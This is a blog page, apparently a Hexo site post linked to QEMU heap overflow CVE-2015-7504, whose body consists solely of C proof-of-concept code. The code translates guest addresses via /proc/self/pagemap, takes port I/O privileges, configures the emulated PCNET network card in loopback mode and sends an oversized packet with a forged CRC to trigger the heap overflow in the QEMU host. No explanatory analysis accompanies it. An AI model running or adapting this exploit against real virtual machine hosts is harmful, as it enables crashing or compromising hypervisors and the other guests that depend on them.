<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"morningbread.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="#include &lt;sys&#x2F;io.h&gt;#include &lt;sys&#x2F;mman.h&gt; #include &lt;arpa&#x2F;inet.h&gt;#include &lt;assert.h&gt;#include &lt;err.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;limits.h">
<meta property="og:type" content="article">
<meta property="og:title" content="a">
<meta property="og:url" content="https://morningbread.github.io/2021/03/10/QEMU%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20CVE-2015-7504/index.html">
<meta property="og:site_name" content="coco&#39;s blog">
<meta property="og:description" content="#include &lt;sys&#x2F;io.h&gt;#include &lt;sys&#x2F;mman.h&gt; #include &lt;arpa&#x2F;inet.h&gt;#include &lt;assert.h&gt;#include &lt;err.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;limits.h">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2021-03-10T07:24:05.000Z">
<meta property="article:modified_time" content="2021-03-10T07:24:58.868Z">
<meta property="article:author" content="coco">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://morningbread.github.io/2021/03/10/QEMU%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20CVE-2015-7504/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>a | coco's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">coco's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://morningbread.github.io/2021/03/10/QEMU%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20CVE-2015-7504/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="coco">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="coco's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          a
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-03-10 15:24:05 / 修改时间：15:24:58" itemprop="dateCreated datePublished" datetime="2021-03-10T15:24:05+08:00">2021-03-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/qemu/" itemprop="url" rel="index"><span itemprop="name">qemu</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>#include &lt;sys/io.h&gt;<br>#include &lt;sys/mman.h&gt;</p>
<p>#include &lt;arpa/inet.h&gt;<br>#include &lt;assert.h&gt;<br>#include &lt;err.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;inttypes.h&gt;<br>#include &lt;limits.h&gt;<br>#include &lt;pthread.h&gt;<br>#include &lt;stdbool.h&gt;<br>#include &lt;stdint.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;unistd.h&gt;</p>
<p>#define PAGE_SHIFT      12<br>#define PAGE_SIZE       (1 &lt;&lt; PAGE_SHIFT)<br>#define PFN_PRESENT     (1ull &lt;&lt; 63)<br>#define PFN_PFN         ((1ull &lt;&lt; 55) - 1)</p>
<p>#define page_aligned <strong>attribute</strong>((aligned(PAGE_SIZE)))</p>
<p>#define PCNET_BUFFER_SIZE 4096<br>#define PCNET_PORT        0xc140</p>
<p>#define DRX     0x0001<br>#define DTX     0x0002<br>#define LOOP    0x0004<br>#define DXMTFCS 0x0008<br>#define INTL    0x0040<br>#define DRCVPA  0x2000<br>#define DRCVBC  0x4000<br>#define PROM    0x8000</p>
<p>enum PCNET_registers {<br>    RDP = 0x10,<br>    RAP = 0x12,<br>    RST = 0x14,<br>};</p>
<p>#define CRC(crc, ch) (crc = (crc &gt;&gt; 8) ^ crctab[(crc ^ (ch)) &amp; 0xff])</p>
<p>/* generated using the AUTODIN II polynomial</p>
<ul>
<li>   x^32 + x^26 + x^23 + x^22 + x^16 +</li>
<li>   x^12 + x^11 + x^10 + x^8 + x^7 + x^5 + x^4 + x^2 + x^1 + 1</li>
<li>/<br>static const uint32_t crctab[256] = {<br>  0x00000000, 0x77073096, 0xee0e612c, 0x990951ba,<br>  0x076dc419, 0x706af48f, 0xe963a535, 0x9e6495a3,<br>  0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988,<br>  0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91,<br>  0x1db71064, 0x6ab020f2, 0xf3b97148, 0x84be41de,<br>  0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,<br>  0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec,<br>  0x14015c4f, 0x63066cd9, 0xfa0f3d63, 0x8d080df5,<br>  0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172,<br>  0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b,<br>  0x35b5a8fa, 0x42b2986c, 0xdbbbc9d6, 0xacbcf940,<br>  0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,<br>  0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116,<br>  0x21b4f4b5, 0x56b3c423, 0xcfba9599, 0xb8bda50f,<br>  0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,<br>  0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d,<br>  0x76dc4190, 0x01db7106, 0x98d220bc, 0xefd5102a,<br>  0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,<br>  0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818,<br>  0x7f6a0dbb, 0x086d3d2d, 0x91646c97, 0xe6635c01,<br>  0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e,<br>  0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457,<br>  0x65b0d9c6, 0x12b7e950, 0x8bbeb8ea, 0xfcb9887c,<br>  0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,<br>  0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2,<br>  0x4adfa541, 0x3dd895d7, 0xa4d1c46d, 0xd3d6f4fb,<br>  0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0,<br>  0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9,<br>  0x5005713c, 0x270241aa, 0xbe0b1010, 0xc90c2086,<br>  0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,<br>  0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4,<br>  0x59b33d17, 0x2eb40d81, 0xb7bd5c3b, 0xc0ba6cad,<br>  0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a,<br>  0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683,<br>  0xe3630b12, 0x94643b84, 0x0d6d6a3e, 0x7a6a5aa8,<br>  0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,<br>  0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe,<br>  0xf762575d, 0x806567cb, 0x196c3671, 0x6e6b06e7,<br>  0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc,<br>  0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5,<br>  0xd6d6a3e8, 0xa1d1937e, 0x38d8c2c4, 0x4fdff252,<br>  0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,<br>  0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60,<br>  0xdf60efc3, 0xa867df55, 0x316e8eef, 0x4669be79,<br>  0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,<br>  0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f,<br>  0xc5ba3bbe, 0xb2bd0b28, 0x2bb45a92, 0x5cb36a04,<br>  0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,<br>  0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a,<br>  0x9c0906a9, 0xeb0e363f, 0x72076785, 0x05005713,<br>  0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38,<br>  0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21,<br>  0x86d3d2d4, 0xf1d4e242, 0x68ddb3f8, 0x1fda836e,<br>  0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,<br>  0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c,<br>  0x8f659eff, 0xf862ae69, 0x616bffd3, 0x166ccf45,<br>  0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2,<br>  0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db,<br>  0xaed16a4a, 0xd9d65adc, 0x40df0b66, 0x37d83bf0,<br>  0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,<br>  0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6,<br>  0xbad03605, 0xcdd70693, 0x54de5729, 0x23d967bf,<br>  0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94,<br>  0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d,<br>};</li>
</ul>
<p>struct pcnet_config {<br>    uint16_t  mode;<br>    uint8_t   rlen;<br>    uint8_t   tlen;<br>    uint8_t   mac[6];<br>    uint16_t _reserved;<br>    uint8_t   ladr[8];<br>    uint32_t  rx_desc;<br>    uint32_t  tx_desc;<br>};</p>
<p>struct pcnet_desc {<br>    uint32_t  addr;<br>    int16_t   length;<br>    int8_t    status_1;<br>    int8_t    status_2;<br>    uint32_t  misc;<br>    uint32_t _reserved;<br>};</p>
<p>static uint8_t pcnet_packet[PCNET_BUFFER_SIZE] = {<br>    //0x52, 0x54, 0x00, 0x12, 0x34, 0x56, 0x52,<br>    //0x54, 0x00, 0x12, 0x34, 0x56, 0x08, 0x00,<br>};</p>
<p>static int fd = -1;</p>
<p>/*</p>
<ul>
<li>taken from virtunoid.c</li>
<li>adress translation utilities</li>
<li>/<br>uint32_t page_offset(uint32_t addr)<br>{<br>  return addr &amp; ((1 &lt;&lt; PAGE_SHIFT) - 1);<br>}</li>
</ul>
<p>uint64_t gva_to_gfn(void *addr)<br>{<br>    uint64_t pme, gfn;<br>    size_t offset;<br>    offset = ((uintptr_t)addr &gt;&gt; 9) &amp; ~7;<br>    lseek(fd, offset, SEEK_SET);<br>    read(fd, &amp;pme, 8);<br>    if (!(pme &amp; PFN_PRESENT))<br>        return -1;<br>    gfn = pme &amp; PFN_PFN;<br>    return gfn;<br>}</p>
<p>uint64_t gva_to_gpa(void *addr)<br>{<br>    uint64_t gfn = gva_to_gfn(addr);<br>    assert(gfn != -1);<br>    return (gfn &lt;&lt; PAGE_SHIFT) | page_offset((uint64_t)addr);<br>}</p>
<p>/* PCNET primitives */<br>void pcnet_packet_patch_crc(uint8_t *packet, uint32_t current,<br>                            uint32_t target)<br>{<br>    size_t i = 0, j;<br>    uint8_t *ptr;<br>    uint32_t workspace[2] = { current, target };<br>    for (i = 0; i &lt; 2; i++)<br>        workspace[i] &amp;= (uint32_t)~0;<br>    ptr = (uint8_t *)(workspace + 1);<br>    for (i = 0; i &lt; 4; i++) {<br>        j = 0;<br>        while(crctab[j] &gt;&gt; 24 != *(ptr + 3 - i)) j++;<br>        *((uint32_t *)(ptr - i)) ^= crctab[j];<br>        *(ptr - i - 1) ^= j;<br>    }<br>    strncpy(packet, ptr - 4, 4);<br>}</p>
<p>uint64_t pcnet_card_config(struct pcnet_config *config,<br>                           struct pcnet_desc *rx_desc,<br>                           struct pcnet_desc *tx_desc)<br>{<br>    memset(config, 0, sizeof(struct pcnet_config));</p>
<pre><code>config-&gt;mode = LOOP | PROM;
strcpy(config-&gt;mac, &quot;\xaa\xbb\xcc\xdd\xee\xff&quot;);
config-&gt;rlen = 0x0;
config-&gt;tlen = 0x0;
config-&gt;rx_desc = (uint32_t)gva_to_gpa(rx_desc);
config-&gt;tx_desc = (uint32_t)gva_to_gpa(tx_desc);
return gva_to_gpa(config);
</code></pre>
<p>}</p>
<p>void pcnet_desc_config(struct pcnet_desc *desc, void *buffer, int is_rx)<br>{<br>    uint16_t bcnt = -PCNET_BUFFER_SIZE;<br>    bcnt &amp;= 0xfff;<br>    bcnt |= 0xf000;</p>
<pre><code>memset(desc, 0, sizeof(struct pcnet_desc));
memset(buffer, 0, PCNET_BUFFER_SIZE);
desc-&gt;addr = (uint32_t)gva_to_gpa(buffer);
desc-&gt;length = bcnt;
if (is_rx) &#123;
    /* receive buffers owned by the card */
    desc-&gt;status_2 = 0x80;
&#125;
</code></pre>
<p>}</p>
<p>void pcnet_packet_send(struct pcnet_desc *desc, void *buffer,<br>                       void *packet, size_t len)<br>{<br>    if (len &lt;= PCNET_BUFFER_SIZE) {<br>        memcpy(buffer, packet, len);</p>
<pre><code>    /* set STP ENP ADDFCS bits */
    desc-&gt;status_2 |= 0x23;

    len = (-len);
    len &amp;= 0xfff;
    len |= 0xf000;
    desc-&gt;length = len;

    /* flip ownership to card */
    desc-&gt;status_2 |= 0x80;

    /* signal packet */
    outw(0, PCNET_PORT + RAP);
    outw(0x8, PCNET_PORT + RDP);
&#125;
</code></pre>
<p>}</p>
<p>int main()<br>{<br>    struct pcnet_config pcnet_config;<br>    uint32_t pcnet_config_mem;<br>    struct pcnet_desc pcnet_tx_desc page_aligned;<br>    struct pcnet_desc pcnet_rx_desc page_aligned;<br>    void *pcnet_rx_buffer, *pcnet_tx_buffer;</p>
<pre><code>void *addr;

uint32_t fcs = ~0;
uint8_t *ptr;

uint16_t lo, hi;

fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY);
if (fd &lt; 0) &#123;
    perror(&quot;open&quot;);
    exit(1);
&#125;

iopl(3);

addr = aligned_alloc(PAGE_SIZE, PCNET_BUFFER_SIZE);
pcnet_rx_buffer = (uint64_t *)addr;

addr = aligned_alloc(PAGE_SIZE, PCNET_BUFFER_SIZE);
pcnet_tx_buffer = (uint64_t *)addr;

pcnet_desc_config(&amp;pcnet_rx_desc, pcnet_rx_buffer, 1);
pcnet_desc_config(&amp;pcnet_tx_desc, pcnet_tx_buffer, 0);

pcnet_config_mem = (uint32_t)pcnet_card_config(&amp;pcnet_config,
                                               &amp;pcnet_rx_desc,
                                               &amp;pcnet_tx_desc);
lo = (uint16_t)pcnet_config_mem;
hi = pcnet_config_mem &gt;&gt; 16;

/* compute required crc */
ptr = pcnet_packet;
while (ptr != &amp;pcnet_packet[PCNET_BUFFER_SIZE - 4])
    CRC(fcs, *ptr++);
pcnet_packet_patch_crc(ptr, fcs, htonl(0xdeadbeef));

/* soft reset */
inl(PCNET_PORT + 0x18);
inw(PCNET_PORT + RST);

/* set swstyle */
outw(58, PCNET_PORT + RAP);
outw(0x0102, PCNET_PORT + RDP);

/* card config */
outw(1, PCNET_PORT + RAP);
outw(lo, PCNET_PORT + RDP);
outw(2, PCNET_PORT + RAP);
outw(hi, PCNET_PORT + RDP);

/* init and start */
outw(0, PCNET_PORT + RAP);
outw(0x3, PCNET_PORT + RDP);

sleep(2);

pcnet_packet_send(&amp;pcnet_tx_desc, pcnet_tx_buffer, pcnet_packet,
                  PCNET_BUFFER_SIZE);

return 0;
</code></pre>
<p>}</p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/02/27/QEMU%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2015-5165/" rel="prev" title="QEMU信息泄漏漏洞分析 CVE-2015-5165">
      <i class="fa fa-chevron-left"></i> QEMU信息泄漏漏洞分析 CVE-2015-5165
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">coco</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">2</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">分类</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">coco</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
